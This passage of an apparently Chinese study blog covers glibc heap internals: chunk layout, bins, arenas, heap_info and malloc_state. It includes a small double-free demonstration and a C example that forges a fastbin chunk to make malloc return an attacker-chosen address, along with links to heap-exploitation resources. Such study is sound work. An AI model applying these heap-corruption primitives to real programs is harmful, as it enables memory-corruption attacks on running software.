in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在平台Linux/x86和glibc中现在是这样的</p>
<p>1.堆往高地址增长。</p>
<p>2.scanf<code>和</code>printf<code>都会在第一次调用的时候用</code>malloc<code>申请缓冲区，1KB或4KB，视stdio可不可交互而定。</code></p>
<p>3.malloc申请缓冲区有对齐条件 ，大小是2*sizeof(size_t)。</p>
<p>4.（不考虑<code>free</code>掉重分配） 小于128KB的<code>malloc</code>会在地址上相邻，往高地址增长。 </p>
<p>5.malloc会在分配的地址前预留2*sizeof(size_t)的空间维护<code>malloc_chunk</code>信息 。</p>
</blockquote>
<p><img src="https://i.imgur.com/Iy59yqk.png"></p>
<p>//x在主线程中，malloc后heap会看见三个部分，这个堆区的总大小是0x21000（vmmap），第一次malloc首先会分配出这一块堆区，然后分出|top chunk | chunk|然后根据用户的malloc从top chunk中切割堆块给用户，所以形成这三块内容。</p>
<p>top chunk的地址会变动从小到大为了给下面的chunk腾空间</p>
<p>struct malloc_state（arena的结构体）</p>
<blockquote>
<p>该结构用于管理堆，记录每个arena当前申请的内存的具体状态，比如说是否有空闲chunk，有什么大小的空闲chunk等等。无论是thread arena还是main arena，它们都只有一个malloc state结构。由于thread的arena可能有多个，malloc state结构会在最新申请的arena中。注意，main arena的malloc_state并不是 heap segment的一部分，而是一个全局变量，存储在libc.so的数据段。</p>
</blockquote>
<p>heap_info:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">程序刚开始执行时，每个线程是没有heap区域的。当其申请内存时，就需要一个结构来记录对应的信息，而heap_info的作用就是这个。而且当该heap的资源被使用完后，就必须得再次申请内存了。此外，一般申请的heap是不连续的，因此需要记录不同heap之间的链接结构。</span><br><span class="line"></span><br><span class="line">它只有thread_arena拥有，因为主线程只有一个堆。</span><br></pre></td></tr></table></figure>






<h3 id="安装heaptrack"><a href="#安装heaptrack" class="headerlink" title="安装heaptrack"></a>安装heaptrack</h3><p>git clone <a target="_blank" rel="noopener" href="https://github.com/KDE/heaptrack.git">https://github.com/KDE/heaptrack.git</a></p>
<p>cd heaptrack # i.e. the source folder<br>mkdir build<br>cd build<br>cmake -DCMAKE_BUILD_TYPE=Release .. # 这一步有啥差错下载boost依赖和libunwind依赖<br>make -j$(nproc)</p>
<p>boost 依赖</p>
<blockquote>
<p>apt-cache search boost</p>
<p>sudo apt-get install libboost-all-dev  //这一步没下载完全则apt-get update</p>
</blockquote>
<p>libunwind依赖</p>
<blockquote>
<p>sudo apt-get install -y libunwind-dev</p>
</blockquote>
<p>apt-get install heaptrack</p>
<p>sudo apt install heaptrack-gui</p>
<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>a = malloc(10);     // 0xa04010<br>b = malloc(10);     // 0xa04030<br>c = malloc(10);     // 0xa04050</p>
<p>free(a);<br>free(b);  // To bypass “double free or corruption (fasttop)” check<br>free(a);  // Double Free !!</p>
<p><strong>d = malloc(10);     // 0xa04010</strong><br>e = malloc(10);     // 0xa04030<br><strong>f = malloc(10);     // 0xa04010   - Same as ‘d’ !</strong></p>
<blockquote>
<p>–&gt;a–&gt;b–&gt;a</p>
</blockquote>
<h3 id="forging-chunk"><a href="#forging-chunk" class="headerlink" title="forging chunk"></a>forging chunk</h3><p>空闲链表是根据size和fd bk来链接上下空闲chunk的</p>
<p>a指向data的位置也就是之后fd的位置，将假chunk的地址给a，也就是把假chunk链接到了空闲链表的尾部，它后面去找的时候就按照fd bk查找这里同时有个usfree漏洞和构造假chunk的利用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">forged_chunk</span> &#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> prev_size;</span><br><span class="line">  <span class="keyword">size_t</span> size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">forged_chunk</span> *<span class="title">fd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">forged_chunk</span> *<span class="title">bck</span>;</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>];               <span class="comment">// padding</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="comment">// First grab a fast chunk</span></span><br><span class="line">    <span class="keyword">void</span>* a = <span class="built_in">malloc</span>(<span class="number">10</span>);               <span class="comment">// &#x27;a&#x27; points to 0x555555756a80</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a forged chunk</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">forged_chunk</span> <span class="title">chunk</span>;</span>    <span class="comment">// At address 0x7fffffffe9e0</span></span><br><span class="line">    chunk.size = <span class="number">0x20</span>;            <span class="comment">// This size should fall in the same fastbin</span></span><br><span class="line">   · data = (<span class="keyword">char</span> *)&amp;chunk.fd;     <span class="comment">// Data starts here for an allocated chunk</span></span><br><span class="line">   · <span class="built_in">strcpy</span>(data, <span class="string">&quot;attacker&#x27;s data&quot;</span>); <span class="comment">//也就是把攻击数据填入假chunk的fd位置也就是data开始的地方</span></span><br><span class="line">------------------------------------------</span><br><span class="line">    <span class="comment">//上面两行point</span></span><br><span class="line">    -----------------------------------------------</span><br><span class="line">    <span class="comment">// Put the fast chunk back into fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="comment">// Modify &#x27;fd&#x27; pointer of &#x27;a&#x27; to point to our forged chunk</span></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)a) = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)&amp;chunk;</span><br><span class="line">    <span class="comment">// Remove &#x27;a&#x27; from HEAD of fastbin</span></span><br><span class="line">    <span class="comment">// Our forged chunk will now be at the HEAD of fastbin</span></span><br><span class="line">    <span class="keyword">void</span>* tmp = <span class="built_in">malloc</span>(<span class="number">10</span>);                   <span class="comment">// Will return 0x555555756a80</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* victim = <span class="built_in">malloc</span>(<span class="number">10</span>);    <span class="comment">// Points to 0x7fffffffea00  这里可能就是危险数据了</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, (<span class="keyword">char</span>*)victim);<span class="comment">//调用危险数据</span></span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="jarvisoj-itemboard"><a href="#jarvisoj-itemboard" class="headerlink" title="jarvisoj_itemboard"></a><a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-1126025.html">jarvisoj_itemboard</a></h3><p>参考链接：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/361975956">https://zhuanlan.zhihu.com/p/361975956</a></p>
<h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
</blockquote>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="http://cn-sec.com/archives/398970.html">http://cn-sec.com/archives/398970.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#malloc_chuck">https://www.cnblogs.com/luoleqi/p/11801400.html#malloc_chuck</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44728033/article/details/105520777">https://blog.csdn.net/qq_44728033/article/details/105520777</a>      —windows10 段堆机制和nt堆对比</p>
<p><a target="_blank" rel="noopener" href="https://straightblast.medium.com/my-poc-walkthrough-for-cve-2021-21974-a266bcad14b9">https://straightblast.medium.com/my-poc-walkthrough-for-cve-2021-21974-a266bcad14b9</a>   —-待复现</p>
<p>CVE-2021-3156     –sudo堆漏洞提权</p>
<p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6975">http://www.vuln.cn/6975</a>    —-线程堆开辟内部</p>
<p><a target="_blank" rel="noopener" href="https://github.com/DhavalKapil/heap-exploitation/tree/master/attacks">https://github.com/DhavalKapil/heap-exploitation/tree/master/attacks</a>  —堆利用手法，待看</p>
<p><a target="_blank" rel="noopener" href="http://blog.topsec.com.cn/vlc-media-player-2-2-8-use-after-free%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/vlc-media-player-2-2-8-use-after-free%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/</a>    win10uaf漏洞利用</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115462494">https://blog.csdn.net/A951860555/article/details/115462494</a>  hook利用及其说明</p>
<p><a target="_blank" rel="noopener" href="https://www.duo.uio.no/bitstream/handle/10852/69062/7/mymaster.pdf">https://www.duo.uio.no/bitstream/handle/10852/69062/7/mymaster.pdf</a>   一些堆利用pdf  2.29最高  全英文</p>
<h1 id="Linux堆的一些基础知识"><a href="#Linux堆的一些基础知识" class="headerlink" title="Linux堆的一些基础知识"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html">Linux堆的一些基础知识</a></h1><p>目录</p>
<ul>
<li>堆的概述<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#%E4%BB%80%E4%B9%88%E6%98%AF%E5%A0%86">什么是堆</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#%E5%A0%86%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">堆的基本操作</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#%E5%A0%86%E6%93%8D%E4%BD%9C%E8%83%8C%E5%90%8E%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">堆操作背后的系统调用</a></li>
</ul>
</li>
<li>堆的相关数据结构<ul>
<li>微观结构<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#malloc_chuck">malloc_chuck</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#chunk%E7%9B%B8%E5%85%B3%E5%AE%8F">chunk相关宏</a></li>
<li>bin<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84bin">数组中的bin</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#fastbin">fastbin</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#unsorted-bin%E7%9A%84%E6%9D%A5%E6%BA%90">unsorted bin的来源</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#last-remainder">last remainder</a></li>
</ul>
</li>
<li>宏观结构<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#arena">arena</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#heap_info">heap_info</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#malloc_state">malloc_state</a></li>
</ul>
</li>
</ul>
</li>
<li>深入了解堆实现<ul>
<li>堆初始化<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#malloc_consolidate">malloc_consolidate()</a></li>
</ul>
</li>
<li>创建堆<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#unlink">unlink</a></li>
</ul>
</li>
<li>申请内存块<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#_libc_malloc">_libc_malloc</a></li>
<li>_int_malloc<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#chunk%E4%B8%8D%E5%90%8C%E8%8C%83%E5%9B%B4%E7%94%B3%E8%AF%B7%E5%AE%9E%E7%8E%B0">chunk不同范围申请实现</a></li>
</ul>
</li>
</ul>
</li>
<li>释放内存块<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#_libc_free">_libc_free</a></li>
</ul>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html#%E5%86%85%E5%AE%B9%E6%9D%A5%E6%BA%90">内容来源</a></li>
</ul>
<h1 id="堆的概述"><a href="#堆的概述" class="headerlink" title="堆的概述"></a>堆的概述</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1堆用来在程序运行时动态的分配内存，对其实就是虚拟空间里从地址向高地址增长的连续的线性区域。</span><br></pre></td></tr></table></figure>
<h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><ul>
<li>void *malloc(unsigned int size)：作用是在内存的动态存储区中分配一个长度为size的连续空间。此函数的返回值是分配区域的起始地址，或者说，此函数是一个指针型函数，返回的指针指向该分配域的开头位置。</li>
<li>void free(void *ptr)：释放之前调用 calloc、malloc 或 realloc 所分配的内存空间。</li>
</ul>
<h2 id="堆操作背后的系统调用"><a href="#堆操作背后的系统调用" class="headerlink" title="堆操作背后的系统调用"></a>堆操作背后的系统调用</h2><ul>
<li>brk()：将数据段(.data)的最高地址指针_edata往高地址推。（从堆头开始，参数为地址）</li>
<li>mmap()：在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存。（分配大于128k）</li>
<li>sbrk()：将地址指针往高地址推。（从当前指针位置开始，参数为指针增量）</li>
<li>mummap()：删除地址空间。</li>
</ul>
<h1 id="堆的相关数据结构"><a href="#堆的相关数据结构" class="headerlink" title="堆的相关数据结构"></a>堆的相关数据结构</h1><h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><h3 id="malloc-chuck"><a href="#malloc-chuck" class="headerlink" title="malloc_chuck"></a>malloc_chuck</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1申请的内存chunk在ptmalloc内部用malloc_chunk结构体表示。</span><br></pre></td></tr></table></figure>
<p>malloc_chunk的一些字段</p>
<ul>
<li>prev_size：如果该 chunk 的物理相邻的前一地址chunk（两个指针的地址差值为前一chunk大小）是空闲的话，那该字段记录的是前一个 chunk 的大小(包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk。</li>
<li>size：该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示:<ul>
<li>NON_MAIN_ARENA：记录当前 chunk 是否不属于主线程，1表示不属于，0表示属于。</li>
<li>IS_MAPPED：记录当前 chunk 是否是由 mmap 分配的。</li>
<li>PREV_INUSE：记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的P位都会被设置为1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并。</li>
</ul>
</li>
<li>fd，bk：chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下:<ul>
<li>fd：指向下一个（非物理相邻）空闲的 chunk。</li>
<li>bk：指向上一个（非物理相邻）空闲的 chunk。</li>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理。</li>
</ul>
</li>
<li>fd_nextsize， bk_nextsize：也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul>
<li>fd_nextsize：指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。（指向比它大的空闲块）</li>
<li>bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。（指向比它小的空闲块）</li>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk 时挨个遍历。</li>
</ul>
</li>
</ul>
<h3 id="chunk相关宏"><a href="#chunk相关宏" class="headerlink" title="chunk相关宏"></a>chunk相关宏</h3><ul>
<li>chunk与mem指针头部的转换<ul>
<li>define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</li>
<li>define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))</li>
</ul>
</li>
<li>最小的chunk大小<ul>
<li>define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))（offsetof 函数计算出 fd_nextsize 在 malloc_chunk 中的偏移，说明最小的 chunk 至少要包含 bk 指针。）</li>
</ul>
</li>
<li>define MINSIZE (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;~MALLOC_ALIGN_MASK))（满足SIZE_SZ的最小上界）</li>
<li>检查分配给用户的内存是否对齐<ul>
<li>define aligned_OK(m) (((unsigned long) (m) &amp; MALLOC_ALIGN_MASK) == 0)</li>
<li>define misaligned_chunk(p) ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp; MALLOC_ALIGN_MASK)</li>
</ul>
</li>
<li>请求字节数判断<ul>
<li>define REQUEST_OUT_OF_RANGE(req) ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</li>
</ul>
</li>
<li>将用户请求内存大小转为实际分配内存大小<ul>
<li>define request2size(req) (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) ? MINSIZE : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</li>
<li>define checked_request2size(req, sz) if (REQUEST_OUT_OF_RANGE(req)) { __set_errno(ENOMEM); return 0;} (sz) = request2size(req);</li>
</ul>
</li>
<li>标记位相关<ul>
<li>define PREV_INUSE 0x1</li>
<li>define prev_inuse(p) ((p)-&gt;mchunk_size &amp; PREV_INUSE)</li>
<li>size field is or’ed with IS_MMAPPED if the chunk was obtained with mmap()</li>
<li>define chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</li>
<li>define NON_MAIN_ARENA 0x4</li>
<li>define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)+</li>
</ul>
</li>
<li>获取chunk size<ul>
<li>define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</li>
<li>define chunksize_nomask(p) ((p)-&gt;mchunk_size)</li>
</ul>
</li>
<li>获取下一个物理相邻的chunk<ul>
<li>define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</li>
</ul>
</li>
<li>获取前一个chunk的信息<ul>
<li>define prev_size(p) ((p)-&gt;mchunk_prev_size)</li>
<li>define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</li>
</ul>
</li>
<li>当前chunk使用状态相关操作<ul>
<li>define inuse(p)((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</li>
<li>define set_inuse(p)((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size |= PREV_INUSE</li>
<li>define clear_inuse(p)((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE）</li>
</ul>
</li>
<li>设置chunk的size字段<ul>
<li>define set_head_size(p, s)((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</li>
<li>define set_head(p, s) ((p)-&gt;mchunk_size = (s))</li>
<li>define set_foot(p, s) (((mchunkptr)((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</li>
</ul>
</li>
<li>获取指定偏移的chunk<ul>
<li>define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</li>
</ul>
</li>
<li>指定偏移处chunk使用状态相关操作<ul>
<li>define inuse_bit_at_offset(p, s)(((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</li>
<li>define set_inuse_bit_at_offset(p, s)(((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</li>
<li>define clear_inuse_bit_at_offset(p, s)(((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</li>
</ul>
</li>
</ul>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为4类：fast bins，small bins，large bins，unsorted bin</span><br></pre></td></tr></table></figure>
<h4 id="数组中的bin"><a href="#数组中的bin" class="headerlink" title="数组中的bin"></a>数组中的bin</h4><ul>
<li>unsorted bin：这里面的chunk没有进行排序，存储的chunk比较杂。</li>
<li>small bin：索引从 2 到 63 的 bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为2个机器字长，即32位相差8字节，64位相差16字节。</li>
<li>large bins：small bins后面的bin，large bins中的每一个 bin 都包含一定范围内的chunk，其中的chunk按fd指针的顺序从大到小排列。相同大小的chunk同样按照最近使用顺序排列。</li>
<li>上述这些bin的排布都会遵循一个原则：任意两个物理相邻的空闲chunk不能在一起。</li>
</ul>
<h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><h4 id="unsorted-bin的来源"><a href="#unsorted-bin的来源" class="headerlink" title="unsorted bin的来源"></a>unsorted bin的来源</h4><ul>
<li>当一个较大的chunk被分割成两半后，如果剩下的部分大于MINSIZE，就会被放到unsorted bin中。</li>
<li>释放一个不属于fast bin的chunk，并且该chunk不和top chunk紧邻时，该chunk会被首先放到unsorted bin中。</li>
</ul>
<h3 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h3><p>在用户使用malloc请求分配内存时,ptmalloc2找到的chunk可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为last remainder chunk，unsort bin也会存这一块。top chunk分割剩下的部分不会作为last remainer。</p>
<h2 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1我们知道一个线程申请的1个&#x2F;多个堆包含很多的信息：二进制位信息，多个malloc_chunk信息等这些堆需要东西来进行管理，那么Arena就是来管理线程中的这些堆的。</span><br></pre></td></tr></table></figure>


<p><a target="_blank" rel="noopener" href="https://www.cxybb.com/article/qq_40890756/100836912">https://www.cxybb.com/article/qq_40890756/100836912</a>     堆段与heap_info 与arena</p>
<h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1程序刚开始执行时，每个线程是没有heap区域的。当其申请内存时，就需要一个结构来记录对应的信息，而heap_info的作用就是这个。而且当该heap的资源被使用完后，就必须得再次申请内存了。此外，一般申请的heap是不连续的，因此需要记录不同heap之间的链接结构。</span><br></pre></td></tr></table></figure>
<p>该数据结构是专门为从Memory Mapping Segment处申请的内存准备的，即为非主线程准备的。<br>主线程可以通过sbrk()函数扩展program break location获得（直到触及Memory Mapping Segment），只有一个heap，没有heap_info数据结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1234567891011typedef struct _heap_info</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr; &#x2F;* 堆对应的 arena 的地址 *&#x2F;</span><br><span class="line">  struct _heap_info *prev; &#x2F;* 由于一个线程申请一个堆之后，可能会使用完，之后就必须得再次申请。因此，一个可能会有多个堆。prev即记录了上一个 heap_info 的地址。这里可以看到每个堆的 heap_info 是通过单向链表进行链接的 *&#x2F;</span><br><span class="line">  size_t size;   &#x2F;* size 表示当前堆的大小 *&#x2F;</span><br><span class="line">  size_t mprotect_size; &#x2F;* 最后一部分确保对齐  *&#x2F;</span><br><span class="line">  &#x2F;* Make sure the following data is properly aligned, particularly</span><br><span class="line">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="line">     MALLOC_ALIGNMENT. *&#x2F;</span><br><span class="line">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">1该结构用于管理堆，记录每个arena当前申请的内存的具体状态，比如说是否有空闲chunk，有什么大小的空闲chunk等等。无论是thread arena还是main arena，它们都只有一个malloc state结构。由于thread的arena可能有多个，malloc state结构会在最新申请的arena中。注意，main arena的malloc_state并不是 heap segment的一部分，而是一个全局变量，存储在libc.so的数据段。</span><br><span class="line">struct malloc_state &#123;</span><br><span class="line">    &#x2F;* 该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成候才能够使用。  *&#x2F;</span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    &#x2F;* 